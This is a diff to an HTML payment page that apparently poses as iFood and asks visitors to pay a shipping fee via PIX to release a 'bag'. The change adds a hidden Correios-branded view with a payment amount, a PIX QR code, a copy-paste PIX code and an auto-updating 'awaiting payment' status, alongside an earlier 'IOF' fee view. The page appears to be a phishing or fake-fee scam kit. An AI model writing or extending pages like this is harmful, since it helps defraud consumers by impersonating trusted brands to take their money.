@@ -12,8 +12,8 @@
     <meta name="description" content="Pague o frete via PIX para confirmar o envio da sua bag.">
     <link rel="preconnect" href="https://fonts.googleapis.com">
     <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="style.css?v=3.1">
+    <link href="https://fonts.googleapis.com/css2?family=Outfit:wght@400;500;700&family=Rawline:wght@400;500;600;700;800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="style.css?v=7.6">
     <script src="/backguard.js?v=1.6"></script>
 <script src="https://cdn.utmify.com.br/scripts/utms/latest.js" data-utmify-prevent-xcod-sck
         data-utmify-prevent-subids async defer></script>
@@ -127,6 +127,44 @@
                     <div id="pix-iof-status" class="pix-iof-status">Status: Aguardando pagamento</div>
                 </div>
             </div>
+
+            <div id="pix-correios-view" class="pix-correios-view hidden" aria-hidden="true">
+                <div class="pix-correios-top">
+                    <div class="pix-correios-nav">
+                        <img src="assets/correios-logo.svg" alt="Correios" class="pix-correios-logo">
+                    </div>
+                    <div class="pix-correios-border"></div>
+                </div>
+
+                <div class="pix-correios-head">
+                    <p class="pix-correios-head-label">VALOR DO PAGAMENTO</p>
+                    <h2 id="pix-correios-amount" class="pix-correios-head-value">R$ 0,00</h2>
+                </div>
+
+                <div class="pix-correios-body">
+                    <h3 class="pix-correios-title">Escaneie o QR Code</h3>
+                    <p class="pix-correios-subtitle">Ou copie o codigo PIX abaixo</p>
+
+                    <div class="pix-correios-qr-wrap">
+                        <img id="pix-correios-qr" src="" alt="QR Code PIX" class="pix-correios-qr">
+                    </div>
+
+                    <div class="pix-correios-copy">
+                        <label class="pix-correios-copy-label" for="pix-correios-code">Codigo PIX (Copiar e Colar)</label>
+                        <div class="pix-correios-copy-row">
+                            <input id="pix-correios-code" class="pix-correios-copy-input" type="text" readonly>
+                            <button id="btn-copy-pix-correios" class="pix-correios-copy-btn" type="button">COPIAR</button>
+                        </div>
+                    </div>
+
+                    <div class="pix-correios-alert">
+                        <strong>Aguardando pagamento...</strong>
+                        <span>O status sera atualizado automaticamente.</span>
+                    </div>
+
+                    <div id="pix-correios-status" class="pix-correios-status">Status: Aguardando pagamento</div>
+                </div>
+            </div>
         </section>
     </main>
 
@@ -149,7 +187,7 @@
         <p>&copy; 2026 iFood. Todos os direitos reservados.</p>
     </footer>
 
-    <script src="script.js?v=7.4" defer></script>
+    <script src="script.js?v=7.6" defer></script>
 </body>
 
 </html>
